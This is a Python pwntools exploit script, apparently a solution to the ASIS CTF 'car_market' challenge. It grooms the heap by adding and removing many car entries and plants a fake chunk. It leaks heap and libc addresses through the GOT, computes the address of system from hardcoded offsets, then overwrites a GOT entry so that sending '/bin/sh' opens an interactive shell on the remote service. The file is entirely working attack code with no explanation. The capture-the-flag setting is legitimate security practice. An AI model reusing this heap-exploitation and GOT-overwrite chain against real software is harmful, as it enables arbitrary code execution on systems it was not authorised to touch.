#!/usr/bin/python

from pwn import *

DEBUG = True
MODE = "r"

if MODE == "r":
  p = remote("car-market.asis-ctf.ir", 31337)
else:
  p = process("./car_market")

# p = remote("localhost", 4000)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def list_car():
  r(">\n")
  p.sendline("1")

def set_model(model):
  r(">\n")
  p.sendline("2")

  r("model\n")
  p.sendline(model)

def add_car(model, price):
  #r(">\n")
  p.sendline("2")

  #r("model\n")
  p.sendline(model)

  #r("price\n")
  p.sendline(str(price))

def remove_car(idx):
  #r(">\n")
  p.sendline("3")

  #r("index")
  p.sendline(str(idx))

def select_car(idx):
  r(">\n")
  p.sendline("4")

  r("index")
  p.sendline(str(idx))

def exit_menu():
  r(">\n")
  p.sendline("5")

def leak():
  r(">\n")
  p.sendline("1")

  r("Model  : ")
  response = r(" \n")
  
  addr = response.split(" ")[0]
  addr = addr.ljust(8, "\x00")
  addr_val = u64(addr)

  log.info("Leak: %x" % addr_val)
  
  return u64(addr)

fake_heap = 0x6020b8
buf = 0x6020e0
setvbuf_got = 0x602070

if MODE == "r":
  setvbuf_offset = 0x6fdb0
  atoi_offset = 0x36e70
  system_offset = 0x45380
else:
  setvbuf_offset = 0x705a0
  atoi_offset = 0x39e40
  system_offset = 0x46590

for i in range(0x82):
  add_car(p64(setvbuf_got) + p64(buf)[:7], 100)

#for i in range(0x81):
#  add_car(str(i).ljust(8, "A") + p64(buf)[:7], 100)

  #log.info(i)

for i in range(0x51):
  remove_car(1)

#p.interactive()

remove_car(48)
select_car(47)

heap_offset = 0x604770 - 0x603820
adj = 0x30

heap_leak = leak()
first_chunk = heap_leak - heap_offset + adj

set_model(p64(fake_heap))

exit_menu()

add_car("AAAAAAAA" + p64(buf)[:7], 100)
add_car(p64(first_chunk), 100)

select_car(0)
setvbuf_leak = leak()

system_addr = setvbuf_leak - setvbuf_offset + system_offset

set_model(p64(setvbuf_leak) + p64(system_addr)[:7])
# list_car()

p.sendline("/bin/sh")

p.interactive()

p.close()
